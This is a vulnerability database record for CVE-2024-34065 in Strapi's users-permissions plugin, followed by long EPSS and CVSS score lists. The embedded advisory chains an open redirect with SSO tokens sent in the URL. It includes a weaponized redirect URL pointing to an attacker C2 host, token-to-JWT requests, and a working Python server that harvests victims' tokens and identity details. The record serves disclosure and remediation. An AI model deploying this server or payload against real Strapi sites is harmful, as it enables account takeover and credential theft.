vulnerability_id: VCID-ycc4-7zzx-aaap
aliases:
  - CVE-2024-34065
  - GHSA-wrvh-rcmr-9qfc
summary: |
  @strapi/plugin-users-permissions leaks 3rd party authentication tokens and authentication bypass
  ### Summary

  By combining two vulnerabilities (an `Open Redirect` and `session token sent as URL query parameter`) in Strapi framework is its possible of an unauthenticated attacker to bypass authentication mechanisms and retrieve the 3rd party tokens. The attack requires user interaction (one click).

  ### Impact

  Unauthenticated attackers can leverage two vulnerabilities to obtain an 3rd party token and the bypass authentication of Strapi apps.

  ### Technical details

  #### Vulnerability 1: Open Redirect

  ##### Description

  Open redirection vulnerabilities arise when an application incorporates user-controllable data into the target of a redirection in an unsafe way. An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain.

  In the specific context of Strapi, this vulnerability allows the SSO token to be stolen, allowing an attacker to authenticate himself within the application.

  ##### Remediation

  If possible, applications should avoid incorporating user-controllable data into redirection targets. In many cases, this behavior can be avoided in two ways:

  - Remove the redirection function from the application, and replace links to it with direct links to the relevant target URLs.
  - Maintain a server-side list of all URLs that are permitted for redirection. Instead of passing the target URL as a parameter to the redirector, pass an index into this list.

  If it is considered unavoidable for the redirection function to receive user-controllable input and incorporate this into the redirection target, one of the following measures should be used to minimize the risk of redirection attacks:

  - The application should use relative URLs in all of its redirects, and the redirection function should strictly validate that the URL received is a relative URL.
  - The application should use URLs relative to the web root for all of its redirects, and the redirection function should validate that the URL received starts with a slash character. It should then prepend <span dir="">http://yourdomainname.com</span> to the URL before issuing the redirect.

  ###### Example 1: Open Redirect in <span dir="">/api/connect/microsoft</span> via `$_GET["callback"]`

  - Path: <span dir="">/api/connect/microsoft</span>
  - Parameter: `$_GET["callback"]`

  Payload:

  ```plaintext
  https://google.fr/
  ```

  Final payload:

  ```plaintext
  https://<TARGET>/api/connect/microsoft?callback=https://google.fr/
  ```

  User clicks on the link:
  ![c1](https://github.com/strapi/strapi/assets/30262080/c1944cf8-2ef0-4214-ba9e-d4aad10d85ba)

  Look at the intercepted request in Burp and see the redirect to Microsoft:

  ![c0](https://github.com/strapi/strapi/assets/30262080/0c3d9289-432c-46ac-a7e3-eafe15f02483)

  Microsoft check the cookies and redirects to the original domain (and route) but with different GET parameters.

  Then, the page redirects to the domain controlled by the attacker (and a token is added to controlled the URL):

  ![c2](https://github.com/strapi/strapi/assets/30262080/009e3898-1ccf-4ee4-9c29-496ff6b302d0)

  The domain originally specified (https://google.fr) as `$_GET["callback"]` parameter is present in the cookies. So <span dir="">\<TARGET\></span> is using the cookies (`koa.sess`) to redirect.

  ![c3](https://github.com/strapi/strapi/assets/30262080/4c25cb6c-c9e8-4c2d-aa61-1ad1442e5f4d)

  `koa.sess` cookie:

  ```base64
  eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2dvb2dsZS5mci8ifX0sIl9leHBpcmUiOjE3MDAyMzQyNDQyNjMsIl9tYXhBZ2UiOjg2NDAwMDAwfQ==
  ```

  ```json
  {"grant":{"provider":"microsoft","dynamic":{"callback":"https://google.fr/"}},"_expire":1700234244263,"_maxAge":86400000}
  ```

  The vulnerability seems to come from the application's core:

  File: [<span dir="">packages/plugins/users-permissions/server/controllers/auth.js</span>](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/controllers/auth.js)

  ```js
  'use strict';

  /**
   * Auth.js controller
   *
   * @description: A set of functions called "actions" for managing `Auth`.
   */

  /* eslint-disable no-useless-escape */
  const crypto = require('crypto');
  const _ = require('lodash');
  const { concat, compact, isArray } = require('lodash/fp');
  const utils = require('@strapi/utils');
  const {
    contentTypes: { getNonWritableAttributes },
  } = require('@strapi/utils');
  const { getService } = require('../utils');
  const {
    validateCallbackBody,
    validateRegisterBody,
    validateSendEmailConfirmationBody,
    validateForgotPasswordBody,
    validateResetPasswordBody,
    validateEmailConfirmationBody,
    validateChangePasswordBody,
  } = require('./validation/auth');

  const { getAbsoluteAdminUrl, getAbsoluteServerUrl, sanitize } = utils;
  const { ApplicationError, ValidationError, ForbiddenError } = utils.errors;

  const sanitizeUser = (user, ctx) => {
    const { auth } = ctx.state;
    const userSchema = strapi.getModel('plugin::users-permissions.user');

    return sanitize.contentAPI.output(user, userSchema, { auth });
  };

  module.exports = {
    async callback(ctx) {
      const provider = ctx.params.provider || 'local';
      const params = ctx.request.body;

      const store = strapi.store({ type: 'plugin', name: 'users-permissions' });
      const grantSettings = await store.get({ key: 'grant' });

      const grantProvider = provider === 'local' ? 'email' : provider;

      if (!_.get(grantSettings, [grantProvider, 'enabled'])) {
        throw new ApplicationError('This provider is disabled');
      }

      if (provider === 'local') {
        await validateCallbackBody(params);

        const { identifier } = params;

        // Check if the user exists.
        const user = await strapi.query('plugin::users-permissions.user').findOne({
          where: {
            provider,
            $or: [{ email: identifier.toLowerCase() }, { username: identifier }],
          },
        });

        if (!user) {
          throw new ValidationError('Invalid identifier or password');
        }

        if (!user.password) {
          throw new ValidationError('Invalid identifier or password');
        }

        const validPassword = await getService('user').validatePassword(
          params.password,
          user.password
        );

        if (!validPassword) {
          throw new ValidationError('Invalid identifier or password');
        }

        const advancedSettings = await store.get({ key: 'advanced' });
        const requiresConfirmation = _.get(advancedSettings, 'email_confirmation');

        if (requiresConfirmation && user.confirmed !== true) {
          throw new ApplicationError('Your account email is not confirmed');
        }

        if (user.blocked === true) {
          throw new ApplicationError('Your account has been blocked by an administrator');
        }

        return ctx.send({
          jwt: getService('jwt').issue({ id: user.id }),
          user: await sanitizeUser(user, ctx),
        });
      }

      // Connect the user with the third-party provider.
      try {
        const user = await getService('providers').connect(provider, ctx.query);

        if (user.blocked) {
          throw new ForbiddenError('Your account has been blocked by an administrator');
        }

        return ctx.send({
          jwt: getService('jwt').issue({ id: user.id }),
          user: await sanitizeUser(user, ctx),
        });
      } catch (error) {
        throw new ApplicationError(error.message);
      }
    },

    //...

    async connect(ctx, next) {
      const grant = require('grant-koa');

      const providers = await strapi
        .store({ type: 'plugin', name: 'users-permissions', key: 'grant' })
        .get();

      const apiPrefix = strapi.config.get('api.rest.prefix');
      const grantConfig = {
        defaults: {
          prefix: `${apiPrefix}/connect`,
        },
        ...providers,
      };

      const [requestPath] = ctx.request.url.split('?');
      const provider = requestPath.split('/connect/')[1].split('/')[0];

      if (!_.get(grantConfig[provider], 'enabled')) {
        throw new ApplicationError('This provider is disabled');
      }

      if (!strapi.config.server.url.startsWith('http')) {
        strapi.log.warn(
          'You are using a third party provider for login. Make sure to set an absolute url in config/server.js. More info here: https://docs.strapi.io/developer-docs/latest/plugins/users-permissions.html#setting-up-the-server-url'
        );
      }

      // Ability to pass OAuth callback dynamically
      grantConfig[provider].callback =
        _.get(ctx, 'query.callback') ||
        _.get(ctx, 'session.grant.dynamic.callback') ||
        grantConfig[provider].callback;
      grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

      return grant(grantConfig)(ctx, next);
    },

    //...

  };
  ```

  And more specifically:

  ```js
  ...

      // Ability to pass OAuth callback dynamically
      grantConfig[provider].callback =
        _.get(ctx, 'query.callback') ||
        _.get(ctx, 'session.grant.dynamic.callback') ||
        grantConfig[provider].callback;
      grantConfig[provider].redirect_uri = getService('providers').buildRedirectUri(provider);

      return grant(grantConfig)(ctx, next);
  ...
  ```

  Possible patch:

  ```js
  grantConfig[provider].callback = process.env[`${provider.toUpperCase()}_REDIRECT_URL`] || grantConfig[provider].callback
  ```

  `_.get(ctx, 'query.callback')` = `$_GET["callback"]` and `_.get(ctx, 'session')` = `$_COOKIE["koa.sess"]` (which is `{"grant":{"provider":"microsoft","dynamic":{"callback":"https://XXXXXXX/"}},"_expire":1701275652123,"_maxAge":86400000}`) so `_.get(ctx, 'session.grant.dynamic.callback')` = `https://XXXXXXX/`.

  The route is clearly defined here:

  File: [<span dir="">packages/plugins/users-permissions/server/routes/content-api/auth.js</span>](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/routes/content-api/auth.js)

  ```js
  'use strict';

  module.exports = [

  //...

    {
      method: 'GET',
      path: '/auth/:provider/callback',
      handler: 'auth.callback',
      config: {
        prefix: '',
      },
    },

    //...

  ];
  ```

  File: [<span dir="">packages/plugins/users-permissions/server/services/providers-registry.js</span>](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/services/providers-registry.js)

  ```js

  const getInitialProviders = ({ purest }) => ({

  //..

    async microsoft({ accessToken }) {
      const microsoft = purest({ provider: 'microsoft' });

      return microsoft
        .get('me')
        .auth(accessToken)
        .request()
        .then(({ body }) => ({
          username: body.userPrincipalName,
          email: body.userPrincipalName,
        }));
    },

  //..

  });
  ```

  If parameter `$_GET["callback"]` is defined in the GET request, the assignment does not evaluate all conditions, but stops at the beginning. The value is then stored in the cookie `koa.sess`:

  `koa.sess`=`eyJncmFudCI6eyJwcm92aWRlciI6Im1pY3Jvc29mdCIsImR5bmFtaWMiOnsiY2FsbGJhY2siOiJodHRwczovL2FkbWluLmludGUubmV0YXRtby5jb20vdXNlcnMvYXV0aC9yZWRpcmVjdCJ9fSwiX2V4cGlyZSI6MTcwMTI3NTY1MjEyMywiX21heEFnZSI6ODY0MDAwMDB9`

  Which once base64 decoded become `{"grant":{"provider":"microsoft","dynamic":{"callback":"https://<TARGET>/users/auth/redirect"}},"_expire":1701275652123,"_maxAge":86400000}`.

  The signature of the cookie is stored in cookie `koa.sess.sig`:

  `koa.sess.sig`=`wTRmcVRrn88hWMdg84VvSD87-_0`

  File: [<span dir="">packages/plugins/users-permissions/server/bootstrap/grant-config.js</span>](https://github.com/strapi/strapi/blob/develop/packages/plugins/users-permissions/server/bootstrap/grant-config.js)

  ```js

  //..

    microsoft: {
      enabled: false,
      icon: 'windows',
      key: '',
      secret: '',
      callback: `${baseURL}/microsoft/callback`,
      scope: ['user.read'],
    },

  //..
  ```

  #### Vulnerability 2: Session token in URL

  ##### Description

  Applications should not send session tokens as URL query parameters and use instead an alternative mechanism for transmitting session tokens, such as HTTP cookies or hidden fields in forms that are submitted using the POST method.

  ###### Example 1: SSO token transmitted within URL (`$_GET["access_token"]`)

  - Path: <span dir="">/api/connect/microsoft</span>
  - Parameter: `$_GET["callback"]`

  When a callback was called, the 3rd party token was transmitted in an insecure way within the URL, which could be used to increase the impact of the Open Redirect vulnerability described previously by stealing the SSO token.

  Weaponized payload:

  ```plaintext
  https://<TARGET>/api/connect/microsoft?callback=http://<C2>:8080/
  ```

  With a web server specially developed to exploit the vulnerability listening on <span dir="">\<C2\>:8080</span>,  it is possible to retrieve a JWT token allowing authentication on Strapi.

  A user is on his browser when he decides to click on a link sent to him by e-mail.

  ![c4](https://github.com/strapi/strapi/assets/30262080/c6e22fa1-14a4-4c76-a832-d07305f265b6)

  > The attacker places the malicious link in the URL bar to simulate a victim's click.

  ![c5](https://github.com/strapi/strapi/assets/30262080/4da28c5b-6501-4f93-9041-9917a2b070e6)

  The server specially developed by the attacker to show that the vulnerability is exploitable, recovers the user's SSO token.

  > Everything is invisible to the victim.

  ![c6](https://github.com/strapi/strapi/assets/30262080/58db0a31-3b3b-4648-958b-953eba88bf87)

  Because the victim didn't change to another Web page.

  ![c7](https://github.com/strapi/strapi/assets/30262080/ab4dd6f9-02e1-42c9-9142-434db865f0d3)

  The attacker can use the SSO token to authenticate himself within the application and retrieve a valid JWT token enabling him to interact with it.

  ![c8](https://github.com/strapi/strapi/assets/30262080/aab8d22f-5f0e-4a67-85a8-2e333df9b84b)

  ##### Details

  ###### Get the JWT token with the `access_token`

  First of all, thanks to the SSO token, you authenticate yourself and get a JWT token to be able to interact with the various API routes.

  Request (HTTP):

  ```http
  GET /api/auth/microsoft/callback?access_token=eyJ0eXAiOiJKV<REDACTED>yBzA HTTP/1.1
  Host: <TARGET>

  ```

  Response (HTTP):

  ```http
  HTTP/1.1 200 OK
  Server: nginx
  Date: Mon, 27 Nov 2023 17:58:46 GMT
  Content-Type: application/json; charset=utf-8
  Content-Length: 411
  Connection: keep-alive
  Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
  Referrer-Policy: no-referrer
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  X-DNS-Prefetch-Control: off
  X-Download-Options: noopen
  X-Frame-Options: SAMEORIGIN
  X-Permitted-Cross-Domain-Policies: none
  Vary: Origin
  X-XSS-Protection: 1; mode=block
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Powered-By: <REDACTED>

  {"jwt":"eyJhbG<REDACTED>eCac","user":{"id":111,"username":"<REDACTED>@<REDACTED>-ext.com","email":"<redacted>@<redacted>-ext.com","provider":"microsoft","confirmed":true,"blocked":false,"createdAt":"2023-11-14T12:35:42.440Z","updatedAt":"2023-11-16T21:00:19.241Z","is_external":false}}
  ```

  ###### Request API routes using the JWT token

  Then reuse the JWT token to request the API.

  Request (HTTP):

  ```http
  GET /api/users/me/groups?app=support HTTP/1.1
  Host: <TARGET>
  Authorization: Bearer eyJ<REDACTED>EeCac

  ```

  Response (HTTP):

  ```http
  HTTP/1.1 200 OK
  Server: nginx
  Date: Tue, 28 Nov 2023 13:45:42 GMT
  Content-Type: application/json; charset=utf-8
  Content-Length: 24684
  Connection: keep-alive
  Content-Security-Policy: connect-src 'self' https:;img-src 'self' data: blob: https://market-assets.strapi.io;media-src 'self' data: blob:;default-src 'self';base-uri 'self';font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
  Referrer-Policy: no-referrer
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Content-Type-Options: nosniff
  X-DNS-Prefetch-Control: off
  X-Download-Options: noopen
  X-Frame-Options: SAMEORIGIN
  X-Permitted-Cross-Domain-Policies: none
  Vary: Origin
  X-RateLimit-Limit: 10
  X-RateLimit-Remaining: 9
  X-RateLimit-Reset: 1701179203
  X-XSS-Protection: 1; mode=block
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-Powered-By: <REDACTED>

  {"apps":{"support":{"groups":[{"device_whitelist":null,"name":"test - support","id":10,"group_privileges":[{"id":37,<REDACTED>

  ...
  ```

  ### POC (Web server stealing SSO token and retrieving JWT token then bypassing authentication)

  ```python
  import base64
  import json
  import urllib.parse

  from http.server import BaseHTTPRequestHandler, HTTPServer
  from sys import argv


  # Strapi URL.
  TARGET = "target.com"

  # URLs to which victims are automatically redirected.
  REDIRECT_URL = [
      "strapi.io",
      "www.google.fr"
  ]
  # URL used to generate a valid JWT token for authentication within the
  # application.
  GEN_JWT_URL = f"https://{TARGET}/api/auth/microsoft/callback"


  # This function is used to generate a curl command which once executed, will
  # give us a valid JWT connection token.
  def generate_curl_command(token):
      command = f"curl '{GEN_JWT_URL}?access_token={token}'"
      return command


  # We create a custom HTTP server to retrieve users' SSO tokens.
  class CustomServer(BaseHTTPRequestHandler):

      # Here we override the default logging function to reduce verbosity.
      def log_message(self, format, *args):
          pass

      # This function automatically redirects a user to the page defined in the
      # global variable linked to the redirection.
      def _set_response(self):
          self.send_response(302)
          self.send_header("Location", REDIRECT_URL[0])
          self.end_headers()

      # If an SSO token is present, we parse it and log the result in STDOUT.
      def do_GET(self):
          # This condition checks whether a token is present in the URL.
          if str(self.path).find("access_token") != -1:
              # If this is the case, we recover the token.
              query = urllib.parse.urlparse(self.path).query
              query_components = dict(qc.split("=") for qc in query.split("&"))
              access_token = urllib.parse.unquote(query_components["access_token"])

              # In the token, which is a string in JWT format, we retrieve the
              # body part of the token.
              interesting_data = access_token.split(".")[1]

              # Patching base64 encoded data.
              interesting_data = interesting_data + "=" * (-len(interesting_data) % 4)

              # Parsing JSON.
              json_data = json.loads(base64.b64decode(interesting_data.encode()))
              family_name, given_name, ipaddr, upn = json_data["given_name"], json_data["family_name"], json_data["ipaddr"], json_data["upn"]

              print(f"[+] Token captured for {family_name} {given_name}, {upn} ({ipaddr}):\n{access_token}\n")
              print(f"[*] Run: \"{generate_curl_command(query_components['access_token'])}\" to get JWT token")

          self._set_response()
          self.wfile.write("Redirecting ...".encode("utf-8"))


  def run(server_class=HTTPServer, handler_class=CustomServer, ip="0.0.0.0", port=8080):
      server_address = (ip, port)
      httpd = server_class(server_address, handler_class)

      print(f"Starting httpd ({ip}:{port}) ...")
      try:
          httpd.serve_forever()
      except KeyboardInterrupt:
          pass

      httpd.server_close()
      print("Stopping httpd ...")


  if __name__ == "__main__":
      if len(argv) == 3:
          run(ip=argv[1], port=int(argv[2]))
      else:
          run()
  ```
severities:
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38746'
    published_at: '2024-11-28 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38761'
    published_at: '2024-12-03 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38940'
    published_at: '2024-12-11 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.39001'
    published_at: '2024-12-13 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.39069'
    published_at: '2024-12-15 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38634'
    published_at: '2024-11-21 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38726'
    published_at: '2024-11-23 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38721'
    published_at: '2024-11-24 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38732'
    published_at: '2024-11-26 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38266'
    published_at: '2024-11-01 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38527'
    published_at: '2024-11-18 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00087'
    scoring_system: epss
    scoring_elements: '0.38606'
    published_at: '2024-11-20 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.45876'
    published_at: '2024-12-17 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.45900'
    published_at: '2024-12-19 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.45881'
    published_at: '2024-12-27 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00115'
    scoring_system: epss
    scoring_elements: '0.46175'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35965'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.36003'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35983'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35982'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.36007'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.3594'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35873'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35981'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35973'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35969'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35996'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.36058'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.36052'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00145'
    scoring_system: epss
    scoring_elements: '0.35943'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00516'
    scoring_system: epss
    scoring_elements: '0.63981'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67091'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67195'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.672'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67214'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67236'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67226'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00605'
    scoring_system: epss
    scoring_elements: '0.67222'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69154'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69143'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69132'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69113'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69144'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.6914'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.00672'
    scoring_system: epss
    scoring_elements: '0.69137'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: '0.14268'
    scoring_system: epss
    scoring_elements: '0.90674'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
  - score: HIGH
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-wrvh-rcmr-9qfc
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/strapi/strapi
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/strapi/strapi
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    published_at: None
    url: https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc
  - score: '7.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-34065
  - score: '8.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-34065
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-34065
weaknesses:
  - CWE-294
  - CWE-601
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-34065
    reference_type:
    reference_id:
  - url: https://github.com/strapi/strapi
    reference_type:
    reference_id:
  - url: https://github.com/strapi/strapi/commit/9c79921d22142a5de77ea26151550a14e4b12669
    reference_type:
    reference_id:
  - url: https://github.com/strapi/strapi/security/advisories/GHSA-wrvh-rcmr-9qfc
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-34065
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/search/results?adv_search=true&isCpeNameSearch=true&query=cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
    reference_type:
    reference_id: cpe:2.3:a:strapi:strapi:*:*:*:*:*:*:*:*
  - url: https://github.com/advisories/GHSA-wrvh-rcmr-9qfc
    reference_type:
    reference_id: GHSA-wrvh-rcmr-9qfc
